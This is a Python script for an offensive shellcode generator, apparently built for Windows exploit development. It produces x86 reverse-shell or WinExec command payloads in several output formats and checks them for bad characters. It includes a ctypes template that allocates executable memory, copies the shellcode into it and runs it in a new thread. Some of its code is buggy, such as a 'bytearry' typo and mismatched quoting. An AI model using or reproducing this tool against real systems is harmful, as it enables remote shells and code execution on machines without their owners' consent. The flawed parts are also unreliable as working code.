#!/usr/bin/env python3

import argparse
import re

from keystone import *

from generate import generate


def main(args):
    filename = ""
    format = ""
    badchars = 0
    test = args.test
    if args.revshell:
        if args.cmd:
            print(
                "This tool cannot peform both revshell and cmd at same time. You must choose one."
            )
            exit()
        if args.lhost:
            if args.lport:
                lhost = args.lhost
                lport = args.lport
            else:
                print("You must specify a port")
                exit()
        else:
            print("You must specify a lhost!")
            exit()
        if args.verbose:
            print(
                f"Entering revshell mode. Revshell will be generated for {lhost}:{lport}"
            )
        mode = "revshell"
        arguments = (lhost, lport)

    elif args.cmd:
        if args.revshell:
            print(
                "This tool cannot peform both revshell and cmd at same time. You must choose one."
            )
            exit()
        if args.verbose:
            print(
                f"Entering cmd mode. Your command is {args.cmd}. A payload using the WinExec api call will be made."
            )
        mode = "cmd"
        arguments = args.cmd
    else:
        print("You must choose revshell of cmd in order to get output")
        exit()

    # Handle specified output file 
    if args.output:
        filename = args.output
        if format !=0:
            if args.format in ("assembly","raw","keystone","python","csharp","c"):
                format = args.format
                if args.verbose:
                    print(f"Creating shellcode in format: {format}\nSaving to file: {filename}")
            else:
                print(f"Improper format supplied. {filename} will not be created.")
                exit()
        else:
            format = "keystone"
            if args.verbose:
                print(f"No format specified for output file: {filename}. Defaulting to {format}.")

    # Handle lack of specified output file by making default files when an output file is required.
    elif args.test or (args.format == "keystone"):
        match args.format:
            case 0:
                format = "keystone"
                filename = "kshellcode.py"
            case "keystone":
                format = args.format
                filename = "kshellcode.py"
            case "python":
                filename = "shellcode.py"
                format = args.format
            case "csharp":
                filename = "shellcode.cs"
                format = args.format
            case "c":
                filename = "shellcode.c"
                format = args.format
            case "python":
                filename = "shellcode.py"
                format = args.format
            case _:
                print(
                    "You have chosen an invalid format, test files can only be created for keystone, python, csharp and c"
                )
                exit()
        if args.verbose:
            print(
                f"You have chosen to create a test file called {filename} using format {format}"
            )
    # Handle lack of given output file when stdout is a viable option
    else:
        if args.format != 0:
            if args.format in ("assembly", "raw", "python", "csharp", "c"):
                format = args.format
            elif args.format in ("keystone"):
                print("keystone output requires an outfile.")
                exit()
            else:
                print("Improper format given.")
                exit()
        else:
            format = "raw"
            if args.verbose:
                print("No format or output file given. Defaulting to raw and printing to stdout")
        if args.verbose:
            print("You have not given an input file, will output to stdout.")

    
    # Handle bad character testing 
    if args.bad:
            badchars = [int(val.strip(), 16) for val in args.bad.split(",")]
            hexchars = ", ".join(f"0x{val:02x}" for val in badchars)
            if args.verbose:
                print(
                    f"You are creating shellcode and testing for the badchars {hexchars}. The output will be stored as a keystone python script in {filename}."
                )




    assembly, encoding = generate(mode, arguments)

    writeOutput(filename, format, test, assembly, encoding, badchars)


def pythonFormat(encoding):
    shellcode = 'shellcode = bytearry("'
    for e in encoding:
        shellcode += "\\x{0:02x}".format(int(e)).rstrip("\n")
    shellcode += ')"'
    return shellcode


def csharpFormat(encoding):
    shellcode = "byte[] buf = {\n"
    count = 0
    length = len(encoding)
    for e in encoding:
        shellcode += "0x{0:02x}".format(int(e)).rstrip("\n")
        if count < length - 1:
            shellcode += ", "
            count += 1
            if count % 16 == 0:
                shellcode += "\n"
        else:
            shellcode += "\n}"
    return shellcode


def cFormat(encoding):
    shellcode = "unsigned char buf [] = "
    for e in encoding:
        shellcode += "\\x{0:02x}".format(int(e)).rstrip("\n")
    shellcode += '";'
    return shellcode


def rawFormat(encoding):
    shellcode = ""
    for e in encoding:
        shellcode += "\\x{0:02x}".format(int(e)).rstrip("\n")
    return shellcode

def testBad(assembly, encoding, badchars, format):
    output = ""
    print("Looking for bad characters in all shellcode (simple test)")
    if any(val in encoding for val in badchars):
        print("there is a bad character")
        results = []
        for instruction in assembly.splitlines():
            try:
                ks = Ks(KS_ARCH_X86, KS_MODE_32)
                opcode, count = ks.asm(instruction)
                if any(val in opcode for val in badchars):
                    opcodes = []
                    for e in opcode:
                        opcodes += "{0:02x} ".format(int(e)).rstrip("\n")
                    results.append(f"{''.join(opcodes)}: {instruction}")
                    output += f"######## Bad Character located at instruction below ############\"\n### {''.join(opcodes)}: {instruction}\"\n"
                    output += f'"{instruction}"\n'
                else:
                    output += f'"{instruction}"\n'
            except:
                output += f'"{instruction}"\n'
                continue
        if not results:
            print(
                "The bad character is most likely in a jump instruction, dissassemble with an online disassembler to find it"
            )
        else:
            print(
                "Bad characters were found in the following instructions:"
            )
            for result in results:
                print(result)
    else:
        print("no bad characters found!")
        output += f'"{re.sub("\n", "\"\n\"", assembly)}"'
        output += "\""

    if format == "keystone":
        return output 

def writeOutput(filename, format, test, assembly, encoding, badchars):
    match format:
        case "assembly":
            output = assembly
            if badchars:
                testBad(assembly, encoding, badchars, format)
        case "python":
            if test == 0:
                output = pythonFormat(encoding)
            else:
                output = "import struct, ctypes\n\n"
                output += pythonFormat(encoding)
                output += PYSCRUNNER
            if badchars:
                testBad(assembly, encoding, badchars, format)
        case "csharp":
            if test == 0:
                output = csharpFormat(encoding)
            else:
                print("This feature is not yet built")
            if badchars:
                testBad(assembly, encoding, badchars, format)
        case "keystone":
            output = ""
            if args.test:
                output = "import ctypes\n"
            output += "import struct\nimport re\nfrom keystone import *\n"
            if badchars:
                output += BADFUNC 
            output += "ASSEMBLY = (\n"
            if badchars:
                output += f"{testBad(assembly, encoding, badchars, format)}"
            else:
                output += f'"{re.sub("\n", "\"\n\"", assembly)}"'
                output += "\""
            output = output[:-1]
            output += "\n)\n"
            output += KSTEMPLATE
            output += f"badchars = {badchars}\n"
            output += BADTEST
            output += PRINTSHELLCODE
            if args.test:
                output += PYSCRUNNER
        case "c":
            if test == 0:
                output = cFormat(encoding)
            else:
                print("This feature is not yet built")
            if badchars:
                testBad(assembly, encoding, badchars, format)
        case "raw":
            if test == 0:
                output = rawFormat(encoding)
            else:
                print("This feature is not yet built")
            if badchars:
                testBad(assembly, encoding, badchars, format)

        case _:
            print("You have chosen an invalid format")
            exit()

    if filename != "":
        with open(filename, "w") as fhand:
            fhand.write(output)
    else:
        print(output)


KSTEMPLATE = '''
# Build the shell code
ks = Ks(KS_ARCH_X86, KS_MODE_32)
encoding, count = ks.asm(ASSEMBLY)
print(f"Encoded {count} instructions")
badchars = [0, 40, 160]
pretty = "\\n".join(
    line.lstrip()
    for line in ASSEMBLY.replace(": ", ":\\n").replace(";", ";\\n").splitlines()
)
assembly = re.sub(r"(\\w+): ", r"\\n\1:", pretty)
'''

PRINTSHELLCODE = (
    'sh = b""\n'
    'shellcode_printable = ""\n'
    "for e in encoding:\n"
    '\tsh += struct.pack("B", e)\n'
    '\tshellcode_printable += "\\\\x{0:02x}".format(int(e)).rstrip("\\n")\n'
    "shellcode = bytearray(sh)\n"
    'print(f"size = {len(shellcode)}")\n'
    'print("shellcode = b\\"" + shellcode_printable + "\\"")\n'
)
PYSCRUNNER = (
    "\n\n"
    "ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),\n"
    "\t\t\t\t\t\tctypes.c_int(len(shellcode)),\n"
    "\t\t\t\t\t\tctypes.c_int(0x3000),\n"
    "\t\t\t\t\t\tctypes.c_int(0x40))\n"
    "buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)\n"
    "ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),\n"
    "\t\t\t\t\tbuf,\n"
    "\t\t\t\t\tctypes.c_int(len(shellcode)))\n"
    'print(f"Shellcode located at address {hex(ptr)}")\n'
    'input("...PRESS ENTER TO RUN THE SHELLCODE...")\n'
    "ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),\n"
    "\t\t\t\t\tctypes.c_int(0),\n"
    "\t\t\t\t\tctypes.c_int(ptr),\n"
    "\t\t\t\t\tctypes.c_int(0),\n"
    "\t\t\t\t\tctypes.c_int(0),\n"
    "\t\t\t\t\tctypes.pointer(ctypes.c_int(0)))\n"
    "ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),\n"
    "\t\t\t\t\tctypes.c_int(-1))\n"
)

BADTEST = (
    "testBad(assembly, encoding, badchars)\n"
)

BADFUNC = '''
def testBad(assembly, encoding, badchars):
    print("Looking for bad characters in all shellcode (simple test)")
    if any(val in encoding for val in badchars):
        print("there is a bad character")
        results = []
        for instruction in assembly.splitlines():
            try:
                ks = Ks(KS_ARCH_X86, KS_MODE_32)
                opcode, count = ks.asm(instruction)
                if any(val in opcode for val in badchars):
                    opcodes = []
                    for e in opcode:
                        opcodes += "{0:02x} ".format(int(e)).rstrip('\\n')
                    results.append(f"{''.join(opcodes)}: {instruction}")
            except:
                continue
        if not results:
            print(
                "The bad character is most likely in a jump instruction, dissassemble with an online disassembler to find it"
            )
        else:
            print(
                "Bad characters were found in the following instructions:"
            )
            for result in results:
                print(result)
    else:
        print("no bad characters found!")
'''

if __name__ == "__main__":
    formathelp = """
    assembly            Output the assembly
    raw                 Output the raw shellcode in format 0xXX, 0xXX.
    keystone            Output assemly-generator file that uses keystone engine to produce shellcode and run it. Has access to several custom formats to ease creation of custom payloads.
    python              Output as python-formatted shellcode. If -t is set, then will generate a .py file to test 
    csharp              Output as csharp-formatted shellcode. If -t is set, then will generate a .cs file to compile and test 
    c                   Output as c-formatted shellcode. If -t is set, then will generate a .c file to compile and test.
    """

    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-v", "--verbose", help="Display additional information", action="store_true"
    )
    parser.add_argument(
        "-r",
        "--revshell",
        help="Create a revshell, must provide an ip address and a port",
        action="store_true",
    )
    parser.add_argument("-l", "--lhost", help="Localhost used for reverse shell")
    parser.add_argument("-p", "--lport", help="Port used for reverse shell")
    parser.add_argument(
        "-c", "--cmd", help="Use the WinExec API call to execute a command"
    )
    parser.add_argument(
        "-o",
        "--output",
        help="Write the shellcode to a file. Format can be specified with -f. The default format is python",
        default=0,
    )
    parser.add_argument("-f", "--format", help=formathelp, default=0)
    parser.add_argument(
        "-t",
        "--test",
        help="Output a file that can be used to test the payload in the specified format. If not filename is given, the default is shellcode.py and the format is keystone.",
        action="store_true",
    )
    parser.add_argument(
        "-b",
        "--bad",
        help="Test for the existence of badchars. Use the format 0x for testing. example: 0x00,0x0a,0x0d. If bad characters are created, will create a keystone format file with badcharacters highlighted.",
        default=0,
    )

    args = parser.parse_args()
    main(args)
